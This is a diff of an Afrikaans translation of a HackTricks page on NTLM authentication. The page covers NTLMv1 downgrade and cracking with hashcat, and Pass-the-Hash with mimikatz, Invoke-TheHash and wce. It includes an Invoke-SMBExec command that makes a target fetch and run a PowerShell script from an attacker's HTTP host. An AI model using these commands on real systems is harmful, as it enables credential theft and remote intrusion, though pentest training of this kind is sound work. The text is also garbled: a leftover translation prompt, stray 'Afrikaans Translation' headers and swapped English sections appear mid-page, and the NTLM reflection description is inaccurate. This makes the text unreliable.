@@ -4,7 +4,7 @@
 
 <summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-* Werk jy in 'n **cybersekerheidsmaatskappy**? Wil jy jou **maatskappy geadverteer sien in HackTricks**? of wil jy toegang hê tot die **nuutste weergawe van die PEASS of HackTricks aflaai in PDF-formaat**? Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
+* Werk jy by 'n **cybersekuriteitsmaatskappy**? Wil jy jou **maatskappy geadverteer sien in HackTricks**? of wil jy toegang hê tot die **nuutste weergawe van die PEASS of HackTricks aflaai in PDF**? Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
 * Ontdek [**Die PEASS-familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
 * Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * **Sluit aan by die** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** my op **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
@@ -20,13 +20,13 @@ Standaard is die **Kerberos**-verifikasieprotokol die primêre metode wat gebrui
 
 Die teenwoordigheid van die **"NTLMSSP"**-kop in netwerkpakkette dui op 'n NTLM-verifikasieproses.
 
-Ondersteuning vir die verifikasieprotokolle - LM, NTLMv1 en NTLMv2 - word fasiliteer deur 'n spesifieke DLL wat geleë is by `%windir%\Windows\System32\msv1\_0.dll`.
+Ondersteuning vir die verifikasieprotokolle - LM, NTLMv1 en NTLMv2 - word gefasiliteer deur 'n spesifieke DLL wat geleë is by `%windir%\Windows\System32\msv1\_0.dll`.
 
 **Kernpunte**:
 
 * LM-hasies is kwesbaar en 'n leë LM-hash (`AAD3B435B51404EEAAD3B435B51404EE`) dui op die nie-gebruik daarvan.
 * Kerberos is die verstek-verifikasiemetode, met NTLM wat slegs onder sekere omstandighede gebruik word.
-* NTLM-verifikasiepakkette is identifiseerbaar deur die "NTLMSSP" kop.
+* NTLM-verifikasiepakkette is identifiseerbaar deur die "NTLMSSP"-kop.
 * LM, NTLMv1 en NTLMv2-protokolle word ondersteun deur die stelsel lêer `msv1\_0.dll`.
 
 ## LM, NTLMv1 en NTLMv2
@@ -37,7 +37,7 @@ Jy kan nagaan en konfigureer watter protokol gebruik sal word:
 
 Voer _secpol.msc_ uit -> Plaaslike beleid -> Sekuriteitsopsies -> Netwerksekuriteit: LAN-bestuurder-verifikasievlak. Daar is 6 vlakke (van 0 tot 5).
 
-![](<../../.gitbook/assets/image (916).png>)
+![](<../../.gitbook/assets/image (919).png>)
 
 ### Register
 
@@ -63,7 +63,7 @@ Moontlike waardes:
 5. Die **bediener stuur** die **domeinbeheerder** die **domeinnaam, die gebruikersnaam, die uitdaging en die antwoord**. As daar **nie 'n Geaktiveerde Gids geconfigureer is nie** of die domeinnaam die naam van die bediener is, word die geloofsbriewe **plaaslik nagegaan**.
 6. Die **domeinbeheerder kyk of alles korrek is** en stuur die inligting na die bediener
 
-Die **bediener** en die **Domeinbeheerder** is in staat om 'n **Veilige Kanaal** via die **Netlogon**-bediener te skep aangesien die Domeinbeheerder die wagwoord van die bediener ken (dit is binne die **NTDS.DIT**-databasis).
+Die **bediener** en die **Domeinbeheerder** is in staat om 'n **Veilige Kanaal** te skep via die **Netlogon**-bediener aangesien die Domeinbeheerder die wagwoord van die bediener ken (dit is binne die **NTDS.DIT**-databasis).
 
 ### Plaaslike NTLM-outentiseringskema
 
@@ -81,17 +81,17 @@ Die **has NT (16 byte)** is verdeel in **3 dele van elk 7 byte** (7B + 7B + (2B+
 * Die 3 dele kan **afsonderlik aangeval word** om die NT-has te vind
 * **DES is kraakbaar**
 * Die 3de sleutel bestaan altyd uit **5 nulls**.
-* Met dieselfde uitdaging sal die antwoord dieselfde wees. Jy kan dus die slagoffer die string "**1122334455667788**" as 'n **uitdaging** gee en die antwoord aanval wat met **voorgekompilserde reënboogtabelle** gebruik is.
+* Met dieselfde uitdaging sal die **antwoord dieselfde wees**. Jy kan dus die slagoffer die string "**1122334455667788**" as 'n **uitdaging** gee en die antwoord aanval wat met **voorgekompilserde reënboogtabelle** gebruik is.
 
 ### NTLMv1-aanval
 
-Dit word al hoe minder algemeen om omgewings met Onbeperkte Delegering geconfigureer te vind, maar dit beteken nie jy kan nie 'n Druksplolerdiens misbruik nie wat geconfigureer is.
+Dit word al hoe minder algemeen om omgewings met Onbeperkte Delegering geconfigureer te vind, maar dit beteken nie jy kan nie 'n Drukspooler-diens misbruik nie wat geconfigureer is.
 
-Jy kan sekere geloofsbriewe/sessies wat jy reeds op die AD het, misbruik om die drukker te vra om teen 'n **gasheer onder jou beheer** te outentiseer. Dan kan jy met `metasploit auxiliary/server/capture/smb` of `responder` die outentiseringsuitdaging instel op 1122334455667788, die outentiseringspoging vasvang, en as dit gedoen is met **NTLMv1** sal jy dit kan **kraak**.\
+Jy kan sekere geloofsbriewe/sessies wat jy reeds op die AD het, misbruik om die drukker te vra om teen 'n **gasheer onder jou beheer** te outentiseer. Dan kan jy met behulp van `metasploit auxiliary/server/capture/smb` of `responder` die outentiseringsuitdaging instel op 1122334455667788, die outentiseringspoging vasvang, en as dit gedoen is met **NTLMv1** sal jy dit kan **kraak**.\
 As jy `responder` gebruik, kan jy probeer om die vlag `--lm` te gebruik om die **outentisering af te gradeer**.\
 _Merk op dat vir hierdie tegniek die outentisering met NTLMv1 uitgevoer moet word (NTLMv2 is nie geldig nie)._
 
-Onthou dat die drukker die rekenaarrekening tydens die outentisering sal gebruik, en rekenaarrekeninge gebruik **lang en willekeurige wagwoorde** wat jy waarskynlik nie sal kan kraak met algemene **woordeboeke** nie. Maar die **NTLMv1**-outentisering **gebruik DES** ([meer inligting hier](./#ntlmv1-challenge)), dus deur van dienste wat spesiaal toegewy is aan die kraak van DES gebruik te maak, sal jy dit kan kraak (jy kan byvoorbeeld [https://crack.sh/](https://crack.sh) gebruik).
+Onthou dat die drukker die rekenaarrekening tydens die outentisering sal gebruik, en rekenaarrekeninge gebruik **lang en willekeurige wagwoorde** wat jy waarskynlik nie sal kan kraak met gewone **woordeboeke** nie. Maar die **NTLMv1**-outentisering **gebruik DES** ([meer inligting hier](./#ntlmv1-uitdaging)), dus deur van sommige dienste wat spesiaal toegewy is aan die kraak van DES gebruik te maak, sal jy dit kan kraak (jy kan byvoorbeeld [https://crack.sh/](https://crack.sh) gebruik).
 
 ### NTLMv1-aanval met hashcat
 
@@ -101,9 +101,7 @@ Die bevel
 ```bash
 python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
 ```
-### Afrikaans Translation:
-
-Die volgende is inhoud uit 'n hakboek oor hak tegnieke. Die volgende inhoud is uit die lêer windows-hardening/ntlm/README.md. Vertaal die relevante Engelse teks na Afrikaans en gee die vertaling terug met presies dieselfde markdown- en html-sintaks. Moet nie dinge soos kode, hak tegniek name, hak woord, wolk/SaaS platform name (soos Workspace, aws, gcp...), die woord 'leak', pentesting, en markdown-etikette vertaal nie. Moet ook nie enige ekstra goed byvoeg buite die vertaling en markdown-sintaks nie.
+Die volgende is inhoud uit 'n hakboek oor hak tegnieke. Die volgende inhoud is uit die lêer windows-hardening/ntlm/README.md. Vertaal die relevante Engelse teks na Afrikaans en gee die vertaling terug met presies dieselfde markdown- en html-sintaks. Moet nie dinge soos kode, hak tegniek name, hak woord, wolk/SaaS platform name (soos Workspace, aws, gcp...), die woord 'leak', pentesting, en markdown etikette vertaal nie. Moet ook nie enige ekstra goed byvoeg buite die vertaling en markdown sintaks nie.
 ```bash
 ['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']
 
@@ -129,7 +127,15 @@ To crack with hashcat:
 To Crack with crack.sh use the following token
 NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
 ```
-Skep 'n lêer met die inhoud van:
+### Windows Hardening: NTLM
+
+#### NTLM Relay Attack
+
+NTLM Relay Attack is a type of attack where an attacker captures the NTLM authentication and relays it to another server to gain unauthorized access. This attack can be mitigated by enabling SMB signing, Extended Protection for Authentication, and disabling NTLMv1.
+
+#### NTLM Reflection Attack
+
+NTLM Reflection Attack is a technique where an attacker sends a malicious link to a victim, and when the victim clicks on the link, their NTLM hash is sent back to the attacker. To prevent this attack, ensure secure coding practices and educate users about phishing attacks.
 ```bash
 727B4E35F947129E:1122334455667788
 A52B9CDEDAE86934:1122334455667788
@@ -138,7 +144,7 @@ Voer hashcat uit (verspreiding is die beste deur 'n instrument soos hashtopolis)
 ```bash
 ./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
 ```
-In hierdie geval weet ons dat die wagwoord hiervoor password is, so ons gaan valsspeel vir demonstrasiedoeleindes:
+In hierdie geval weet ons dat die wagwoord hiervoor wagwoord is, so ons gaan valsspeel vir demonstrasiedoeleindes:
 ```bash
 python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
 DESKEY1: b55d6d04e67926
@@ -155,9 +161,9 @@ b4b9b02e6f09a9 # this is part 1
 ./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
 bd760f388b6700 # this is part 2
 ```
-### Laaste deel:
+### Afrikaans Translation:
 
-Hierdie gedeelte sal fokus op die NTLM-protokol en hoe dit gebruik kan word vir aanvalle en hoe om dit te verhard.
+### Laastelik die laaste deel:
 ```bash
 ./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788
 
@@ -165,15 +171,9 @@ Hierdie gedeelte sal fokus op die NTLM-protokol en hoe dit gebruik kan word vir 
 ```
 ### Windows Hardening: NTLM
 
-#### NTLM Relay Attack
+#### Translation:
 
-##### Description
-
-The NTLM relay attack is a common technique used by attackers to exploit the NTLM authentication protocol. In this attack, the attacker intercepts the NTLM authentication request sent by a victim host and relays it to another host, tricking the second host into believing that the attacker is the victim. This allows the attacker to gain unauthorized access to resources on the second host using the victim's credentials.
-
-##### Mitigation
-
-To mitigate NTLM relay attacks, it is recommended to implement SMB signing, LDAP signing, and Extended Protection for Authentication. Additionally, enforcing the use of Kerberos authentication over NTLM can also help prevent these types of attacks. Regularly monitoring network traffic for suspicious activity can also help detect and prevent NTLM relay attacks.
+### Windows Verharding: NTLM
 ```bash
 NTHASH=b4b9b02e6f09a9bd760f388b6700586c
 ```
@@ -181,18 +181,18 @@ NTHASH=b4b9b02e6f09a9bd760f388b6700586c
 
 Die **uitdagingslengte is 8 byte** en **2 reaksies word gestuur**: Een is **24 byte** lank en die lengte van die **ander** is **veranderlik**.
 
-**Die eerste reaksie** word geskep deur die **string** wat saamgestel is deur die **kliënt en die domein** te versleutel met **HMAC\_MD5** en die **hash MD4** van die **NT-hash** as **sleutel** te gebruik. Dan sal die **resultaat** as **sleutel** gebruik word om die **uitdaging** te versleutel met **HMAC\_MD5**. Hierby sal **'n kliënt-uitdaging van 8 byte bygevoeg word**. Totaal: 24 B.
+**Die eerste reaksie** word geskep deur te sif met behulp van **HMAC\_MD5** die **string** saamgestel deur die **kliënt en die domein** en deur as **sleutel** die **hash MD4** van die **NT-hash** te gebruik. Dan sal die **resultaat** gebruik word as **sleutel** om te sif met **HMAC\_MD5** die **uitdaging**. Hiervoor sal **'n kliënt-uitdaging van 8 byte bygevoeg word**. Totaal: 24 B.
 
-Die **tweede reaksie** word geskep deur **verskeie waardes** te gebruik ('n nuwe kliënt-uitdaging, 'n **tydstempel** om **herhaalaanvalle** te voorkom...)
+Die **tweede reaksie** word geskep deur **verskeie waardes** te gebruik ('n nuwe kliënt-uitdaging, 'n **tydstempel** om **herhaalaanvalle** te voorkom...).
 
 As jy 'n **pcap het wat 'n suksesvolle verifikasieproses vasgevang het**, kan jy hierdie gids volg om die domein, gebruikersnaam, uitdaging en reaksie te kry en probeer om die wagwoord te kraak: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://research.801labs.org/cracking-an-ntlmv2-hash/)
 
-## Pas-die-Hash Toe
+## Pass-the-Hash
 
 **Sodra jy die hash van die slagoffer het**, kan jy dit gebruik om hom te **impersoneer**.\
-Jy moet 'n **werktuig** gebruik wat die **NTLM-verifikasie uitvoer met** daardie **hash**, **of** jy kan 'n nuwe **sessieaanmelding** skep en daardie **hash** in die **LSASS** inspuit, sodat wanneer enige **NTLM-verifikasie uitgevoer word**, daardie **hash gebruik sal word.** Die laaste opsie is wat mimikatz doen.
+Jy moet 'n **werktuig** gebruik wat die **NTLM-verifikasie uitvoer met** daardie **hash**, **of** jy kan 'n nuwe **sessieaanmelding** skep en daardie **hash** binne die **LSASS** inspuit, sodat wanneer enige **NTLM-verifikasie uitgevoer word**, daardie **hash gebruik sal word.** Die laaste opsie is wat mimikatz doen.
 
-**Onthou asseblief dat jy Pas-die-Hash-aanvalle ook met Rekenaarrekeninge kan uitvoer.**
+**Onthou asseblief dat jy Pass-the-Hash-aanvalle ook kan uitvoer met Rekenaarrekeninge.**
 
 ### **Mimikatz**
 
@@ -200,7 +200,7 @@ Jy moet 'n **werktuig** gebruik wat die **NTLM-verifikasie uitvoer met** daardie
 ```bash
 Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
 ```
-Hierdie sal 'n proses lanceer wat aan die gebruikers behoort wat mimikatz begin het, maar intern in LSASS is die gestoorde geloofsbriewe diegene binne die mimikatz parameters. Dan kan jy toegang kry tot netwerkbronne asof jy daardie gebruiker is (soortgelyk aan die `runas /netonly` truuk maar jy hoef nie die plat-teks wagwoord te weet nie).
+Hierdie sal 'n proses begin wat aan die gebruikers behoort wat mimikatz begin het, maar intern in LSASS is die gestoorde geloofsbriewe diegene binne die mimikatz parameters. Dan kan jy toegang kry tot netwerkbronne asof jy daardie gebruiker was (soortgelyk aan die `runas /netonly` truuk maar jy hoef nie die plat-teks wagwoord te weet nie).
 
 ### Pass-the-Hash vanaf Linux
 
@@ -228,7 +228,7 @@ Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Usern
 ```bash
 Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
 ```
-#### Roep-SMB-kliënt aan
+#### Roep-SMB-kliënt
 ```bash
 Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
 ```
@@ -236,9 +236,9 @@ Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38
 ```bash
 Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
 ```
-#### Roep-DieHash
+#### Roep-DieHashAan
 
-Hierdie funksie is 'n **mengsel van al die ander**. Jy kan **verskeie gasheer** deurgee, **uitsonder** sommiges en die **opsie** kies wat jy wil gebruik (_SMBExec, WMIExec, SMBClient, SMBEnum_). As jy enige van **SMBExec** en **WMIExec** kies, maar **geen** _**Opdrag**_ parameter gee nie, sal dit net **kontroleer** of jy genoeg **regte** het.
+Hierdie funksie is 'n **mengsel van al die ander**. Jy kan **verskeie gasheer** deurgee, **uitsonder** sommiges en die **opsie** kies wat jy wil gebruik (_SMBExec, WMIExec, SMBClient, SMBEnum_). As jy **enigeen** van **SMBExec** en **WMIExec** kies, maar jy gee **geen** _**Opdrag**_ parameter nie, sal dit net **kontroleer** of jy **genoeg regte** het.
 ```
 Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
 ```
@@ -278,9 +278,9 @@ wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
 
 <summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-* Werk jy by 'n **cybersekuriteitsmaatskappy**? Wil jy jou **maatskappy geadverteer sien in HackTricks**? of wil jy toegang hê tot die **nuutste weergawe van die PEASS of HackTricks aflaai in PDF-formaat**? Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
-* Ontdek [**Die PEASS-familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
-* Kry die [**amptelike PEASS & HackTricks-klere**](https://peass.creator-spring.com)
+* Werk jy in 'n **cybersekuriteitsmaatskappy**? Wil jy jou **maatskappy geadverteer sien in HackTricks**? of wil jy toegang hê tot die **nuutste weergawe van die PEASS of HackTricks aflaai in PDF-formaat**? Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
+* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
+* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * **Sluit aan by die** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** my op **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Deel jou haktruuks deur PR's in te dien by die** [**hacktricks-opslag**](https://github.com/carlospolop/hacktricks) **en** [**hacktricks-cloud-opslag**](https://github.com/carlospolop/hacktricks-cloud).
 
